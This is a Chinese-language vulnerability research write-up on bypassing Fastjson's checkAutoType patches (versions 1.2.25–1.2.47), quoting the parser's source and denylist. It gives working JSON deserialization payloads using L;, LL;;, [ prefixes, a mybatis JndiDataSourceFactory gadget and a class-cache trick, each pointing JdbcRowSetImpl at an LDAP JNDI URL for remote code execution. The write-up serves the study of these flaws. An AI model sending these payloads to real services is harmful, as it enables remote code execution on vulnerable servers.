## Fastjson1.2.25-1.2.41补丁绕过(用L;绕过、需要开启autotype)

此时我们使用`JdbcRowSetImpl`利用链中JNDI+LDAP的方式，直接运行报错：

![image-20220715213506047](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220715213506047.png)

这是由于在版本 1.2.25 中，官方对之前的反序列化漏洞进行了修复，引入了 checkAutoType 安全机制，默认情况下  autoTypeSupport 关闭，不能直接反序列化任意类，而打开 AutoType 之后，是基于内置黑名单来实现安全的，fastjson  也提供了添加黑名单的接口。

首先将将DefaultJSONParser.parseObject()函数中的`TypeUtils.loadClass`替换为checkAutoType()函数

```
 Class<?> clazz = TypeUtils.loadClass(ref, this.config.getDefaultClassLoader());
```

替换后

```
Class<?> clazz = this.config.checkAutoType(ref, (Class)null);
```

跟进看一下checkAutoType()函数，在`com.alibaba.fastjson.parser.ParserConfig.class`

```java
public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
        if (typeName == null) {
            return null;
        } else {
            String className = typeName.replace('$', '.');
            // autoTypeSupport默认为False
    		// 当autoTypeSupport开启时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤
            if (this.autoTypeSupport || expectClass != null) {
                int i;
                String deny;
                for(i = 0; i < this.acceptList.length; ++i) {
                    deny = this.acceptList[i];
                    if (className.startsWith(deny)) {
                        return TypeUtils.loadClass(typeName, this.defaultClassLoader);
                    }
                }

                for(i = 0; i < this.denyList.length; ++i) {
                    deny = this.denyList[i];
                    if (className.startsWith(deny)) {
                        throw new JSONException("autoType is not support. " + typeName);
                    }
                }
            }
			 // 从Map缓存中获取类，注意这是后面版本的漏洞点
            Class<?> clazz = TypeUtils.getClassFromMapping(typeName);
            if (clazz == null) {
                clazz = this.deserializers.findClass(typeName);
            }

            if (clazz != null) {
                if (expectClass != null && !expectClass.isAssignableFrom(clazz)) {
                    throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                } else {
                    return clazz;
                }
            } else {
                // 当autoTypeSupport未开启时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错
                if (!this.autoTypeSupport) {
                    String accept;
                    int i;
                    for(i = 0; i < this.denyList.length; ++i) {
                        accept = this.denyList[i];
                        if (className.startsWith(accept)) {
                            throw new JSONException("autoType is not support. " + typeName);
                        }
                    }

                    for(i = 0; i < this.acceptList.length; ++i) {
                        accept = this.acceptList[i];
                        if (className.startsWith(accept)) {
                            clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);
                            if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                                throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                            }

                            return clazz;
                        }
                    }
                }
				
                if (this.autoTypeSupport || expectClass != null) {
                    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);
                }

                if (clazz != null) {
                    if (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) {
                        throw new JSONException("autoType is not support. " + typeName);
                    }

                    if (expectClass != null) {
                        if (expectClass.isAssignableFrom(clazz)) {
                            return clazz;
                        }

                        throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                    }
                }

                if (!this.autoTypeSupport) {
                    throw new JSONException("autoType is not support. " + typeName);
                } else {
                    return clazz;
                }
            }
        }
    }

    static {
        String property = IOUtils.getStringProperty("fastjson.parser.deny");
        DENYS = splitItemsFormProperty(property);
        property = IOUtils.getStringProperty("fastjson.parser.autoTypeSupport");
        AUTO_SUPPORT = "true".equals(property);
        property = IOUtils.getStringProperty("fastjson.parser.autoTypeAccept");
        String[] items = splitItemsFormProperty(property);
        if (items == null) {
            items = new String[0];
        }

        AUTO_TYPE_ACCEPT_LIST = items;
        global = new ParserConfig();
        awtError = false;
        jdk8Error = false;
    }
}
```

同时查看类上出现了几个成员变量：布尔型的 autoTypeSupport，用来标识是否开启任意类型的反序列化，并且默认关闭；字符串数组 denyList ，是反序列化类的黑名单；acceptList 是反序列化白名单。

默认情况下autoTypeSupport为False，将其设置为True有两种方法：

- JVM启动参数：`-Dfastjson.parser.autoTypeSupport=true`
- 代码中设置：`ParserConfig.getGlobalInstance().setAutoTypeSupport(true);`，如果有使用非全局ParserConfig则用另外调用`setAutoTypeSupport(true);`

AutoType白名单设置方法：

1. JVM启动参数：`-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.`
2. 代码中设置：`ParserConfig.getGlobalInstance().addAccept("com.xx.a");`
3. 通过fastjson.properties文件配置。在1.2.25/1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：`fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.`

denyList 包括：

```Java
bsh
com.mchange
com.sun.
java.lang.Thread
java.net.Socket
java.rmi
javax.xml
org.apache.bcel
org.apache.commons.beanutils
org.apache.commons.collections.Transformer
org.apache.commons.collections.functors
org.apache.commons.collections4.comparators
org.apache.commons.fileupload
org.apache.myfaces.context.servlet
org.apache.tomcat
org.apache.wicket.util
org.codehaus.groovy.runtime
org.hibernate
org.jboss
org.mozilla.javascript
org.python.core
org.springframework
```

总结一下：

- 如果开启了 autoType，先判断类名是否在白名单中，如果在，就使用 `TypeUtils.loadClass` 加载，然后使用黑名单判断类名的开头，如果匹配就抛出异常。
- 如果没开启 autoType ，则是先使用黑名单匹配，再使用白名单匹配和加载。最后，如果要反序列化的类和黑白名单都未匹配时，只有开启了 autoType 或者 expectClass 不为空也就是指定了 Class 对象时才会调用 `TypeUtils.loadClass` 加载。

### 绕过分析

首先需要开启AutoTypeSupport：

```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
```

给出poc

```java
{
	"@type":"Lcom.sun.rowset.JdbcRowSetImpl;",
	"dataSourceName":"ldap://localhost:7777/evil3",
	"autoCommit":true
}
```

运行即可弹出计算器：

![image-20220717104212783](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220717104212783.png)

接下来调试分析一下，断点设置在checkAutoType()函数：

![image-20220717104806509](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220717104806509.png)

首先由于payload加了`L，;`黑名单匹配不到从而绕过，接下来进入`TypeUtils.loadClass`加载

![image-20220717105026512](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220717105026512.png)

可以看到当匹配到条件判断类名是否以`L`开头、以`;`结尾，如果是则将类名提取出来并加载，由此绕过补丁。

## Fastjson1.2.25-1.2.42补丁绕过(双写L;绕过、需要开启autotype)

在版本 1.2.42 中，fastjson 继续延续了黑白名单的检测模式，但是将黑名单类从白名单修改为使用 HASH  的方式进行对比，这是为了防止安全研究人员根据黑名单中的类进行反向研究，用来对未更新的历史版本进行攻击。同时，作者对之前版本一直存在的使用类描述符绕过黑名单校验的问题尝试进行了修复。

首先是黑名单改为hash

```java
denyHashCodes = new long[]{-8720046426850100497L, -8109300701639721088L, -7966123100503199569L, -7766605818834748097L, -6835437086156813536L, -4837536971810737970L, -4082057040235125754L, -2364987994247679115L, -1872417015366588117L, -254670111376247151L, -190281065685395680L, 33238344207745342L, 313864100207897507L, 1203232727967308606L, 1502845958873959152L, 3547627781654598988L, 3730752432285826863L, 3794316665763266033L, 4147696707147271408L, 5347909877633654828L, 5450448828334921485L, 5751393439502795295L, 5944107969236155580L, 6742705432718011780L, 7179336928365889465L, 7442624256860549330L, 8838294710098435315L};
```

在checkAutoType()函数中新增判断：如果类的第一个字符是 `L` 结尾是 `;`，则使用 substring进行去除。

![image-20220717111446400](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220717111446400.png)

但是这里只进行了一次判断，因此可以通过添加两次的方式来绕过后面的黑名单校验。

之后调用TypeUtils.loadClass()函数时，传入的是`LLcom.sun.rowset.JdbcRowSetImpl;;`

```java
} else if (className.startsWith("L") && className.endsWith(";")) {
                String newClassName = className.substring(1, className.length() - 1);
                return loadClass(newClassName, classLoader);
```

这里会递归调用`loadClass`所以最后能够绕过判断

最后POC：

```java
{
	"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",
	"dataSourceName":"ldap://localhost:7777/evil3",
	"autoCommit":true
}
```

![image-20220717112410439](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220717112410439.png)

## Fastjson1.2.25-1.2.43补丁绕过(用左中括号绕过、需要开启autotype)

这个版本主要是修复上一个版本中双写绕过的问题，`checkAutoType` 函数添加了判断，如果类名连续出现了两个 `L` 将会抛出异常：

![image-20220717143127000](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220717143127000.png)

官方只修复了`L;`但是忽视了`[`，我们可以利用它进行绕过

调试一下，在`TypeUtils.loadClass()`函数中：

![image-20220717144109737](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220717144109737.png)

遇到`[`开头，会调用`Array.newInstance().getClass()`来返回类，在最后反序列化类时，调用了`DefaultJSONParser.parseArray()`函数来解析数组内容，其中会对字符内容格式有一些限制，最终构造poc：

```java
{
	"@type":"[com.sun.rowset.JdbcRowSetImpl"[,
	{"dataSourceName":"ldap://localhost:7777/evil3",
	"autoCommit":true
}
```

![image-20220717145325804](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220717145325804.png)

## Fastjson1.2.25-1.2.45补丁绕过(mybatis的3.x版本且<3.5.0、需要开启autotype)

前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列<3.5.0的版本。

加载依赖：

```xml
<dependency>
        <groupId>org.mybatis</groupId>
        <artifactId>mybatis</artifactId>
        <version>3.4.6</version>
    </dependency>
```

关键类：`org.apache.ibatis.datasource.jndi.JndiDataSourceFactory`

这次先给出POC：

```json
{
    "@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
    "properties":{
        "data_source":"ldap://localhost:7777/evil3"
    }
}
```

或者：

```json
{
    "@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
    "properties":{
        "data_source":"snakin",
        "initial_context":"ldap://localhost:7777/evil3"
    }
}
```

![image-20220717151037212](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220717151037212.png)

### 绕过分析

在1.2.44版本添加了新的判断，如果类名以 `[` 开始则直接抛出异常

![image-20220717151701255](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220717151701255.png)

由于`org.apache.ibatis.datasource.jndi.JndiDataSourceFactory`不在黑名单中，因此能成功绕过checkAutoType()函数的检测。

接下来我们在该类的setter方法断点：

![image-20220717152143795](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220717152143795.png)

这里两个分支即为jndi注入调用点，我们选择任意一个分支构造poc即可

## Fastjson1.2.25-1.2.47绕过

### 说明

- 1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；
- 1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；

其他的限制：基于RMI利用的JDK版本<=6u141、7u131、8u121，基于LDAP利用的JDK版本<=6u211、7u201、8u191

这里由于在1.2.46版本中mybatis类加入了黑名单，无法继续利用。

poc：

```java
{
	"a": {
		"@type": "java.lang.Class",
		"val": "com.sun.rowset.JdbcRowSetImpl"
	},
	"b": {
		"@type": "com.sun.rowset.JdbcRowSetImpl",
		"dataSourceName": "ldap://localhost:7777/evil3",
		"autoCommit": true
	}
}
```

通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，checkAutoType()就会抛出异常终止程序。

这里我们分别分析：

### 不受AutoTypeSupport影响的版本

#### 未开启AutoTypeSupport时

在调用`DefaultJSONParser.parserObject()`函数时，其会对JSON数据进行循环遍历扫描解析。

@type是Class类时会加载val对应的类并写入缓存：

第一次解析时，进入checkAutoType()函数，由于未开启AutoTypeSupport，因此不会进入黑白名单校验的逻辑。之后又由于Mapping为空就进入findClass，最后直接返回。

![image-20220717162005400](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220717162005400.png)

继续跟进，checkAutoType返回后DefaultJSONParser继续运行，来到deserialize继续进行解析，进入了`MiscCodec.deserialize`：这里判断键是否为`val`，是的话再提取val键对应的值赋给objVal变量，而objVal在后面会赋值给strVal变量

![image-20220717163426117](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220717163426117.png)

接着判断clazz是否为Class类，是的话调用`TypeUtils.loadClass()`加载strVal变量值指向的类：

![image-20220717170808523](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220717170808523.png)

在`TypeUtils.loadClass()`函数中，成功加载`com.sun.rowset.JdbcRowSetImpl`类后，就会将其缓存在Map中：

![image-20220717171144525](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220717171144525.png)

之后在扫描第二部分的JSON数据时，由于前面第一部分JSON数据中的val键值`com.sun.rowset.JdbcRowSetImpl`已经缓存到`Map`中了，所以当此时调用`TypeUtils.getClassFromMapping()`时能够成功从Map中获取到缓存的类，进而在下面的判断clazz是否为空的if语句中直接return返回了，从而成功绕过`checkAutoType()`检测 

![image-20220717194104949](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220717194104949.png)

关闭autoTypeSupport加载类会先去缓存Map中查找,如果缓存Map有JdbcRowSetImpl类，那么checkAutoType就会直接返回，因此首先加载Class、再加载JdbcRowSetImpl就完成了绕过，这里就采用了**两层JSON嵌套**

#### 开启AutoTypeSupport时

开启AutoTypeSupport后，在checkAutoType()函数中会进入黑白名单校验的代码逻辑。

在第一部分JSON数据的扫描解析中，由于@type指向java.lang.Class，因此即使是开启AutoTypeSupport先后进行白名单、黑名单校验的情况下都能成功通过检测，之后和前面的一样调用findClass()函数获取到Class类：

![image-20220717194642113](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220717194642113.png)

关键在于第二部分JSON数据的扫描解析。第二部分的@type指向的是利用类`com.sun.rowset.JdbcRowSetImpl`，其中的`com.sun.`是在denyList黑名单中的，但是为何在检测时能成功绕过呢？

我们发现逻辑是先进行白名单再进行黑名单校验，在黑名单校验的if判断条件中是存在两个必须同时满足的条件的：

```java
Arrays.binarySearch(this.denyHashCodes, hash) >= 0 && TypeUtils.getClassFromMapping(typeName) == null
```

第一个判断条件`Arrays.binarySearch(denyHashCodes, hash) >= 0`是满足的，因为我们的@type包含了黑名单的内容；关键在于第二个判断条件`TypeUtils.getClassFromMapping(typeName) == null`，这里由于前面已经将com.sun.rowset.JdbcRowSetImpl类缓存在Map中了，也就是说该条件并不满足，导致能够成功绕过黑名单校验、成功触发漏洞。

### 受AutoTypeSupport影响的版本

#### 未开启AutoTypeSupport时

当不开启AutoTypeSupport时就不会进入该黑白名单校验的代码逻辑中，就不会被过滤报错。

#### 开启AutoTypeSupport时

第一部分还是一样的过程，但是第二部分无法绕过黑名单。

第一个if语句是白名单过滤，第二个if语句是黑名单过滤，其中黑名单过滤的if语句中的判断条件和前面的不受影响的版本的不一样，对比下是少了个判断条件，即`TypeUtils.getClassFromMapping(typeName) == null`。

